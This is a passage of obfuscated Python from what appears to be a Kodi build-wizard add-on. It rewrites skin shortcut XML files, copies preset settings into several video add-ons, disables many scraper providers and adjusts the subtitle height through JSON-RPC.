       OOO0000OO0O00OOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1170
       copyfile (OO00000O0OOOOOOO0 ,OOO0000OO0O00OOOO )#line:1172
    except :#line:1174
       pass #line:1175
def rdbuildaddonON ():#line:1182
    OOO000OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1184
    with open (OOO000OOOOO0O00OO ,'r')as O00O0O00O0OO0O0OO :#line:1185
      OO0OO0OO00O00OOO0 =O00O0O00O0OO0O0OO .read ()#line:1186
    OO0OO0OO00O00OOO0 =OO0OO0OO00O00OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1204
    with open (OOO000OOOOO0O00OO ,'w')as O00O0O00O0OO0O0OO :#line:1207
      O00O0O00O0OO0O0OO .write (OO0OO0OO00O00OOO0 )#line:1208
    OOO000OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1212
    with open (OOO000OOOOO0O00OO ,'r')as O00O0O00O0OO0O0OO :#line:1213
      OO0OO0OO00O00OOO0 =O00O0O00O0OO0O0OO .read ()#line:1214
    OO0OO0OO00O00OOO0 =OO0OO0OO00O00OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1232
    with open (OOO000OOOOO0O00OO ,'w')as O00O0O00O0OO0O0OO :#line:1235
      O00O0O00O0OO0O0OO .write (OO0OO0OO00O00OOO0 )#line:1236
    OOO000OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1240
    with open (OOO000OOOOO0O00OO ,'r')as O00O0O00O0OO0O0OO :#line:1241
      OO0OO0OO00O00OOO0 =O00O0O00O0OO0O0OO .read ()#line:1242
    OO0OO0OO00O00OOO0 =OO0OO0OO00O00OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1260
    with open (OOO000OOOOO0O00OO ,'w')as O00O0O00O0OO0O0OO :#line:1263
      O00O0O00O0OO0O0OO .write (OO0OO0OO00O00OOO0 )#line:1264
    OOO000OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1268
    with open (OOO000OOOOO0O00OO ,'r')as O00O0O00O0OO0O0OO :#line:1269
      OO0OO0OO00O00OOO0 =O00O0O00O0OO0O0OO .read ()#line:1270
    OO0OO0OO00O00OOO0 =OO0OO0OO00O00OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1288
    with open (OOO000OOOOO0O00OO ,'w')as O00O0O00O0OO0O0OO :#line:1291
      O00O0O00O0OO0O0OO .write (OO0OO0OO00O00OOO0 )#line:1292
    OOO000OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1295
    with open (OOO000OOOOO0O00OO ,'r')as O00O0O00O0OO0O0OO :#line:1296
      OO0OO0OO00O00OOO0 =O00O0O00O0OO0O0OO .read ()#line:1297
    OO0OO0OO00O00OOO0 =OO0OO0OO00O00OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1315
    with open (OOO000OOOOO0O00OO ,'w')as O00O0O00O0OO0O0OO :#line:1318
      O00O0O00O0OO0O0OO .write (OO0OO0OO00O00OOO0 )#line:1319
    OOO000OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1321
    with open (OOO000OOOOO0O00OO ,'r')as O00O0O00O0OO0O0OO :#line:1322
      OO0OO0OO00O00OOO0 =O00O0O00O0OO0O0OO .read ()#line:1323
    OO0OO0OO00O00OOO0 =OO0OO0OO00O00OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1341
    with open (OOO000OOOOO0O00OO ,'w')as O00O0O00O0OO0O0OO :#line:1344
      O00O0O00O0OO0O0OO .write (OO0OO0OO00O00OOO0 )#line:1345
    OOO000OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1347
    with open (OOO000OOOOO0O00OO ,'r')as O00O0O00O0OO0O0OO :#line:1348
      OO0OO0OO00O00OOO0 =O00O0O00O0OO0O0OO .read ()#line:1349
    OO0OO0OO00O00OOO0 =OO0OO0OO00O00OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1367
    with open (OOO000OOOOO0O00OO ,'w')as O00O0O00O0OO0O0OO :#line:1370
      O00O0O00O0OO0O0OO .write (OO0OO0OO00O00OOO0 )#line:1371
    OOO000OOOOO0O00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1374
    with open (OOO000OOOOO0O00OO ,'r')as O00O0O00O0OO0O0OO :#line:1375
      OO0OO0OO00O00OOO0 =O00O0O00O0OO0O0OO .read ()#line:1376
    OO0OO0OO00O00OOO0 =OO0OO0OO00O00OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1394
    with open (OOO000OOOOO0O00OO ,'w')as O00O0O00O0OO0O0OO :#line:1397
      O00O0O00O0OO0O0OO .write (OO0OO0OO00O00OOO0 )#line:1398
def rdbuildinstallON ():#line:1401
    try :#line:1403
       OOOOOO00000O00O0O =ADDONPATH +"/resources/rd/victory.xml"#line:1404
       O0O00O00OO00O00O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1405
       copyfile (OOOOOO00000O00O0O ,O0O00O00OO00O00O0 )#line:1407
       OOOOOO00000O00O0O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1409
       O0O00O00OO00O00O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1410
       copyfile (OOOOOO00000O00O0O ,O0O00O00OO00O00O0 )#line:1412
       OOOOOO00000O00O0O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1414
       O0O00O00OO00O00O0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1415
       copyfile (OOOOOO00000O00O0O ,O0O00O00OO00O00O0 )#line:1417
       OOOOOO00000O00O0O =ADDONPATH +"/resources/rd/Splash.png"#line:1420
       O0O00O00OO00O00O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1421
       copyfile (OOOOOO00000O00O0O ,O0O00O00OO00O00O0 )#line:1423
    except :#line:1425
       pass #line:1426
def rdbuild ():#line:1436
	O000OOOOOO0O0OO0O =(ADDON .getSetting ("auto_rd"))#line:1437
	if O000OOOOOO0O0OO0O =='true':#line:1438
		O00000OOO0O0000OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1439
		O00000OOO0O0000OO .setSetting ('all_t','0')#line:1440
		O00000OOO0O0000OO .setSetting ('rd_menu_enable','false')#line:1441
		O00000OOO0O0000OO .setSetting ('magnet_bay','false')#line:1442
		O00000OOO0O0000OO .setSetting ('magnet_extra','false')#line:1443
		O00000OOO0O0000OO .setSetting ('rd_only','false')#line:1444
		O00000OOO0O0000OO .setSetting ('ftp','false')#line:1446
		O00000OOO0O0000OO .setSetting ('fp','false')#line:1447
		O00000OOO0O0000OO .setSetting ('filter_fp','false')#line:1448
		O00000OOO0O0000OO .setSetting ('fp_size_en','false')#line:1449
		O00000OOO0O0000OO .setSetting ('afdah','false')#line:1450
		O00000OOO0O0000OO .setSetting ('ap2s','false')#line:1451
		O00000OOO0O0000OO .setSetting ('cin','false')#line:1452
		O00000OOO0O0000OO .setSetting ('clv','false')#line:1453
		O00000OOO0O0000OO .setSetting ('cmv','false')#line:1454
		O00000OOO0O0000OO .setSetting ('dl20','false')#line:1455
		O00000OOO0O0000OO .setSetting ('esc','false')#line:1456
		O00000OOO0O0000OO .setSetting ('extra','false')#line:1457
		O00000OOO0O0000OO .setSetting ('film','false')#line:1458
		O00000OOO0O0000OO .setSetting ('fre','false')#line:1459
		O00000OOO0O0000OO .setSetting ('fxy','false')#line:1460
		O00000OOO0O0000OO .setSetting ('genv','false')#line:1461
		O00000OOO0O0000OO .setSetting ('getgo','false')#line:1462
		O00000OOO0O0000OO .setSetting ('gold','false')#line:1463
		O00000OOO0O0000OO .setSetting ('gona','false')#line:1464
		O00000OOO0O0000OO .setSetting ('hdmm','false')#line:1465
		O00000OOO0O0000OO .setSetting ('hdt','false')#line:1466
		O00000OOO0O0000OO .setSetting ('icy','false')#line:1467
		O00000OOO0O0000OO .setSetting ('ind','false')#line:1468
		O00000OOO0O0000OO .setSetting ('iwi','false')#line:1469
		O00000OOO0O0000OO .setSetting ('jen_free','false')#line:1470
		O00000OOO0O0000OO .setSetting ('kiss','false')#line:1471
		O00000OOO0O0000OO .setSetting ('lavin','false')#line:1472
		O00000OOO0O0000OO .setSetting ('los','false')#line:1473
		O00000OOO0O0000OO .setSetting ('m4u','false')#line:1474
		O00000OOO0O0000OO .setSetting ('mesh','false')#line:1475
		O00000OOO0O0000OO .setSetting ('mf','false')#line:1476
		O00000OOO0O0000OO .setSetting ('mkvc','false')#line:1477
		O00000OOO0O0000OO .setSetting ('mjy','false')#line:1478
		O00000OOO0O0000OO .setSetting ('hdonline','false')#line:1479
		O00000OOO0O0000OO .setSetting ('moviex','false')#line:1480
		O00000OOO0O0000OO .setSetting ('mpr','false')#line:1481
		O00000OOO0O0000OO .setSetting ('mvg','false')#line:1482
		O00000OOO0O0000OO .setSetting ('mvl','false')#line:1483
		O00000OOO0O0000OO .setSetting ('mvs','false')#line:1484
		O00000OOO0O0000OO .setSetting ('myeg','false')#line:1485
		O00000OOO0O0000OO .setSetting ('ninja','false')#line:1486
		O00000OOO0O0000OO .setSetting ('odb','false')#line:1487
		O00000OOO0O0000OO .setSetting ('ophd','false')#line:1488
		O00000OOO0O0000OO .setSetting ('pks','false')#line:1489
		O00000OOO0O0000OO .setSetting ('prf','false')#line:1490
		O00000OOO0O0000OO .setSetting ('put18','false')#line:1491
		O00000OOO0O0000OO .setSetting ('req','false')#line:1492
		O00000OOO0O0000OO .setSetting ('rftv','false')#line:1493
		O00000OOO0O0000OO .setSetting ('rltv','false')#line:1494
		O00000OOO0O0000OO .setSetting ('sc','false')#line:1495
		O00000OOO0O0000OO .setSetting ('seehd','false')#line:1496
		O00000OOO0O0000OO .setSetting ('showbox','false')#line:1497
		O00000OOO0O0000OO .setSetting ('shuid','false')#line:1498
		O00000OOO0O0000OO .setSetting ('sil_gh','false')#line:1499
		O00000OOO0O0000OO .setSetting ('spv','false')#line:1500
		O00000OOO0O0000OO .setSetting ('subs','false')#line:1501
		O00000OOO0O0000OO .setSetting ('tvs','false')#line:1502
		O00000OOO0O0000OO .setSetting ('tw','false')#line:1503
		O00000OOO0O0000OO .setSetting ('upto','false')#line:1504
		O00000OOO0O0000OO .setSetting ('vel','false')#line:1505
		O00000OOO0O0000OO .setSetting ('vex','false')#line:1506
		O00000OOO0O0000OO .setSetting ('vidc','false')#line:1507
		O00000OOO0O0000OO .setSetting ('w4hd','false')#line:1508
		O00000OOO0O0000OO .setSetting ('wav','false')#line:1509
		O00000OOO0O0000OO .setSetting ('wf','false')#line:1510
		O00000OOO0O0000OO .setSetting ('wse','false')#line:1511
		O00000OOO0O0000OO .setSetting ('wss','false')#line:1512
		O00000OOO0O0000OO .setSetting ('wsse','false')#line:1513
		O00000OOO0O0000OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1514
		O00000OOO0O0000OO .setSetting ('debrid.only','true')#line:1515
		O00000OOO0O0000OO .setSetting ('hosts.captcha','false')#line:1516
		O00000OOO0O0000OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1517
		O00000OOO0O0000OO .setSetting ('provider.123moviehd','false')#line:1518
		O00000OOO0O0000OO .setSetting ('provider.300mbdownload','false')#line:1519
		O00000OOO0O0000OO .setSetting ('provider.alltube','false')#line:1520
		O00000OOO0O0000OO .setSetting ('provider.allucde','false')#line:1521
		O00000OOO0O0000OO .setSetting ('provider.animebase','false')#line:1522
		O00000OOO0O0000OO .setSetting ('provider.animeloads','false')#line:1523
		O00000OOO0O0000OO .setSetting ('provider.animetoon','false')#line:1524
		O00000OOO0O0000OO .setSetting ('provider.bnwmovies','false')#line:1525
		O00000OOO0O0000OO .setSetting ('provider.boxfilm','false')#line:1526
		O00000OOO0O0000OO .setSetting ('provider.bs','false')#line:1527
		O00000OOO0O0000OO .setSetting ('provider.cartoonhd','false')#line:1528
		O00000OOO0O0000OO .setSetting ('provider.cdahd','false')#line:1529
		O00000OOO0O0000OO .setSetting ('provider.cdax','false')#line:1530
		O00000OOO0O0000OO .setSetting ('provider.cine','false')#line:1531
		O00000OOO0O0000OO .setSetting ('provider.cinenator','false')#line:1532
		O00000OOO0O0000OO .setSetting ('provider.cmovieshdbz','false')#line:1533
		O00000OOO0O0000OO .setSetting ('provider.coolmoviezone','false')#line:1534
		O00000OOO0O0000OO .setSetting ('provider.ddl','false')#line:1535
		O00000OOO0O0000OO .setSetting ('provider.deepmovie','false')#line:1536
		O00000OOO0O0000OO .setSetting ('provider.ekinomaniak','false')#line:1537
		O00000OOO0O0000OO .setSetting ('provider.ekinotv','false')#line:1538
		O00000OOO0O0000OO .setSetting ('provider.filiser','false')#line:1539
		O00000OOO0O0000OO .setSetting ('provider.filmpalast','false')#line:1540
		O00000OOO0O0000OO .setSetting ('provider.filmwebbooster','false')#line:1541
		O00000OOO0O0000OO .setSetting ('provider.filmxy','false')#line:1542
		O00000OOO0O0000OO .setSetting ('provider.fmovies','false')#line:1543
		O00000OOO0O0000OO .setSetting ('provider.foxx','false')#line:1544
		O00000OOO0O0000OO .setSetting ('provider.freefmovies','false')#line:1545
		O00000OOO0O0000OO .setSetting ('provider.freeputlocker','false')#line:1546
		O00000OOO0O0000OO .setSetting ('provider.furk','false')#line:1547
		O00000OOO0O0000OO .setSetting ('provider.gamatotv','false')#line:1548
		O00000OOO0O0000OO .setSetting ('provider.gogoanime','false')#line:1549
		O00000OOO0O0000OO .setSetting ('provider.gowatchseries','false')#line:1550
		O00000OOO0O0000OO .setSetting ('provider.hackimdb','false')#line:1551
		O00000OOO0O0000OO .setSetting ('provider.hdfilme','false')#line:1552
		O00000OOO0O0000OO .setSetting ('provider.hdmto','false')#line:1553
		O00000OOO0O0000OO .setSetting ('provider.hdpopcorns','false')#line:1554
		O00000OOO0O0000OO .setSetting ('provider.hdstreams','false')#line:1555
		O00000OOO0O0000OO .setSetting ('provider.horrorkino','false')#line:1557
		O00000OOO0O0000OO .setSetting ('provider.iitv','false')#line:1558
		O00000OOO0O0000OO .setSetting ('provider.iload','false')#line:1559
		O00000OOO0O0000OO .setSetting ('provider.iwaatch','false')#line:1560
		O00000OOO0O0000OO .setSetting ('provider.kinodogs','false')#line:1561
		O00000OOO0O0000OO .setSetting ('provider.kinoking','false')#line:1562
		O00000OOO0O0000OO .setSetting ('provider.kinow','false')#line:1563
		O00000OOO0O0000OO .setSetting ('provider.kinox','false')#line:1564
		O00000OOO0O0000OO .setSetting ('provider.lichtspielhaus','false')#line:1565
		O00000OOO0O0000OO .setSetting ('provider.liomenoi','false')#line:1566
		O00000OOO0O0000OO .setSetting ('provider.magnetdl','false')#line:1569
		O00000OOO0O0000OO .setSetting ('provider.megapelistv','false')#line:1570
		O00000OOO0O0000OO .setSetting ('provider.movie2k-ac','false')#line:1571
		O00000OOO0O0000OO .setSetting ('provider.movie2k-ag','false')#line:1572
		O00000OOO0O0000OO .setSetting ('provider.movie2z','false')#line:1573
		O00000OOO0O0000OO .setSetting ('provider.movie4k','false')#line:1574
		O00000OOO0O0000OO .setSetting ('provider.movie4kis','false')#line:1575
		O00000OOO0O0000OO .setSetting ('provider.movieneo','false')#line:1576
		O00000OOO0O0000OO .setSetting ('provider.moviesever','false')#line:1577
		O00000OOO0O0000OO .setSetting ('provider.movietown','false')#line:1578
		O00000OOO0O0000OO .setSetting ('provider.mvrls','false')#line:1580
		O00000OOO0O0000OO .setSetting ('provider.netzkino','false')#line:1581
		O00000OOO0O0000OO .setSetting ('provider.odb','false')#line:1582
		O00000OOO0O0000OO .setSetting ('provider.openkatalog','false')#line:1583
		O00000OOO0O0000OO .setSetting ('provider.ororo','false')#line:1584
		O00000OOO0O0000OO .setSetting ('provider.paczamy','false')#line:1585
		O00000OOO0O0000OO .setSetting ('provider.peliculasdk','false')#line:1586
		O00000OOO0O0000OO .setSetting ('provider.pelisplustv','false')#line:1587
		O00000OOO0O0000OO .setSetting ('provider.pepecine','false')#line:1588
		O00000OOO0O0000OO .setSetting ('provider.primewire','false')#line:1589
		O00000OOO0O0000OO .setSetting ('provider.projectfreetv','false')#line:1590
		O00000OOO0O0000OO .setSetting ('provider.proxer','false')#line:1591
		O00000OOO0O0000OO .setSetting ('provider.pureanime','false')#line:1592
		O00000OOO0O0000OO .setSetting ('provider.putlocker','false')#line:1593
		O00000OOO0O0000OO .setSetting ('provider.putlockerfree','false')#line:1594
		O00000OOO0O0000OO .setSetting ('provider.reddit','false')#line:1595
		O00000OOO0O0000OO .setSetting ('provider.cartoonwire','false')#line:1596
		O00000OOO0O0000OO .setSetting ('provider.seehd','false')#line:1597
		O00000OOO0O0000OO .setSetting ('provider.segos','false')#line:1598
		O00000OOO0O0000OO .setSetting ('provider.serienstream','false')#line:1599
		O00000OOO0O0000OO .setSetting ('provider.series9','false')#line:1600
		O00000OOO0O0000OO .setSetting ('provider.seriesever','false')#line:1601
		O00000OOO0O0000OO .setSetting ('provider.seriesonline','false')#line:1602
		O00000OOO0O0000OO .setSetting ('provider.seriespapaya','false')#line:1603
		O00000OOO0O0000OO .setSetting ('provider.sezonlukdizi','false')#line:1604
		O00000OOO0O0000OO .setSetting ('provider.solarmovie','false')#line:1605
		O00000OOO0O0000OO .setSetting ('provider.solarmoviez','false')#line:1606
		O00000OOO0O0000OO .setSetting ('provider.stream-to','false')#line:1607
		O00000OOO0O0000OO .setSetting ('provider.streamdream','false')#line:1608
		O00000OOO0O0000OO .setSetting ('provider.streamflix','false')#line:1609
		O00000OOO0O0000OO .setSetting ('provider.streamit','false')#line:1610
		O00000OOO0O0000OO .setSetting ('provider.swatchseries','false')#line:1611
		O00000OOO0O0000OO .setSetting ('provider.szukajkatv','false')#line:1612
		O00000OOO0O0000OO .setSetting ('provider.tainiesonline','false')#line:1613
		O00000OOO0O0000OO .setSetting ('provider.tainiomania','false')#line:1614
		O00000OOO0O0000OO .setSetting ('provider.tata','false')#line:1617
		O00000OOO0O0000OO .setSetting ('provider.trt','false')#line:1618
		O00000OOO0O0000OO .setSetting ('provider.tvbox','false')#line:1619
		O00000OOO0O0000OO .setSetting ('provider.ultrahd','false')#line:1620
		O00000OOO0O0000OO .setSetting ('provider.video4k','false')#line:1621
		O00000OOO0O0000OO .setSetting ('provider.vidics','false')#line:1622
		O00000OOO0O0000OO .setSetting ('provider.view4u','false')#line:1623
		O00000OOO0O0000OO .setSetting ('provider.watchseries','false')#line:1624
		O00000OOO0O0000OO .setSetting ('provider.xrysoi','false')#line:1625
		O00000OOO0O0000OO .setSetting ('provider.library','false')#line:1626
def fixfont ():#line:1629
	O00OOOOO00OO0O0O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1630
	O0OOO0OO0O000000O =json .loads (O00OOOOO00OO0O0O0 );#line:1632
	OO000O00OO00OOOO0 =O0OOO0OO0O000000O ["result"]["settings"]#line:1633
	OO0OOO0OOOO00O00O =[OO0OOOO000OO0O0O0 for OO0OOOO000OO0O0O0 in OO000O00OO00OOOO0 if OO0OOOO000OO0O0O0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1635
	OO000O0OOOOO00OOO =OO0OOO0OOOO00O00O ["options"];#line:1636
	O0O0O00OO00OO000O =OO0OOO0OOOO00O00O ["value"];#line:1637
	O0O00OO00000O0O00 =[O0O00OOO0OO00O0OO for (O0O00OOO0OO00O0OO ,OO00OO0000OOO00O0 )in enumerate (OO000O0OOOOO00OOO )if OO00OO0000OOO00O0 ["value"]==O0O0O00OO00OO000O ][0 ];#line:1639
	OO0OOOO00O0OO0O0O =(O0O00OO00000O0O00 +1 )%len (OO000O0OOOOO00OOO )#line:1641
	O00O0O0OOO00OO000 =OO000O0OOOOO00OOO [OO0OOOO00O0OO0O0O ]["value"]#line:1643
	OO0O000000O00OOOO =OO000O0OOOOO00OOO [OO0OOOO00O0OO0O0O ]["label"]#line:1644
	O0O00OO0O00OO0O00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1646
	try :#line:1648
		O000O0000O0O0O00O =json .loads (O0O00OO0O00OO0O00 );#line:1649
		if O000O0000O0O0O00O ["result"]!=True :#line:1651
			raise Exception #line:1652
	except :#line:1653
		sys .stderr .write ("Error switching audio output device")#line:1654
		raise Exception #line:1655
def parseDOM2 (O00O0O0OO0O0O0OO0 ,name =u"",attrs ={},ret =False ):#line:1656
	if isinstance (O00O0O0OO0O0O0OO0 ,str ):#line:1659
		try :#line:1660
			O00O0O0OO0O0O0OO0 =[O00O0O0OO0O0O0OO0 .decode ("utf-8")]#line:1661
		except :#line:1662
			O00O0O0OO0O0O0OO0 =[O00O0O0OO0O0O0OO0 ]#line:1663
	elif isinstance (O00O0O0OO0O0O0OO0 ,unicode ):#line:1664
		O00O0O0OO0O0O0OO0 =[O00O0O0OO0O0O0OO0 ]#line:1665
	elif not isinstance (O00O0O0OO0O0O0OO0 ,list ):#line:1666
		return u""#line:1667
	if not name .strip ():#line:1669
		return u""#line:1670
	OOO0OOO00OOOO00OO =[]#line:1672
	for O0000OOO000O0O0O0 in O00O0O0OO0O0O0OO0 :#line:1673
		OOO00O0O0OO0OO0OO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0000OOO000O0O0O0 )#line:1674
		for OOOOOO0OOOO000O00 in OOO00O0O0OO0OO0OO :#line:1675
			O0000OOO000O0O0O0 =O0000OOO000O0O0O0 .replace (OOOOOO0OOOO000O00 ,OOOOOO0OOOO000O00 .replace ("\n"," "))#line:1676
		O00O0O00O00O0O00O =[]#line:1678
		for O000OOOO0O0O000O0 in attrs :#line:1679
			OOOOOO0OO0O0OOOOO =re .compile ('(<'+name +'[^>]*?(?:'+O000OOOO0O0O000O0 +'=[\'"]'+attrs [O000OOOO0O0O000O0 ]+'[\'"].*?>))',re .M |re .S ).findall (O0000OOO000O0O0O0 )#line:1680
			if len (OOOOOO0OO0O0OOOOO )==0 and attrs [O000OOOO0O0O000O0 ].find (" ")==-1 :#line:1681
				OOOOOO0OO0O0OOOOO =re .compile ('(<'+name +'[^>]*?(?:'+O000OOOO0O0O000O0 +'='+attrs [O000OOOO0O0O000O0 ]+'.*?>))',re .M |re .S ).findall (O0000OOO000O0O0O0 )#line:1682
			if len (O00O0O00O00O0O00O )==0 :#line:1684
				O00O0O00O00O0O00O =OOOOOO0OO0O0OOOOO #line:1685
				OOOOOO0OO0O0OOOOO =[]#line:1686
			else :#line:1687
				O0O000000O0O000OO =range (len (O00O0O00O00O0O00O ))#line:1688
				O0O000000O0O000OO .reverse ()#line:1689
				for O0O000OOOO0OOOO00 in O0O000000O0O000OO :#line:1690
					if not O00O0O00O00O0O00O [O0O000OOOO0OOOO00 ]in OOOOOO0OO0O0OOOOO :#line:1691
						del (O00O0O00O00O0O00O [O0O000OOOO0OOOO00 ])#line:1692
		if len (O00O0O00O00O0O00O )==0 and attrs =={}:#line:1694
			O00O0O00O00O0O00O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0000OOO000O0O0O0 )#line:1695
			if len (O00O0O00O00O0O00O )==0 :#line:1696
				O00O0O00O00O0O00O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0000OOO000O0O0O0 )#line:1697
		if isinstance (ret ,str ):#line:1699
			OOOOOO0OO0O0OOOOO =[]#line:1700
			for OOOOOO0OOOO000O00 in O00O0O00O00O0O00O :#line:1701
				O00OOO0O0OO000O00 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOOOOO0OOOO000O00 )#line:1702
				if len (O00OOO0O0OO000O00 )==0 :#line:1703
					O00OOO0O0OO000O00 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOOOOO0OOOO000O00 )#line:1704
				for OOOOO000O0O0OO00O in O00OOO0O0OO000O00 :#line:1705
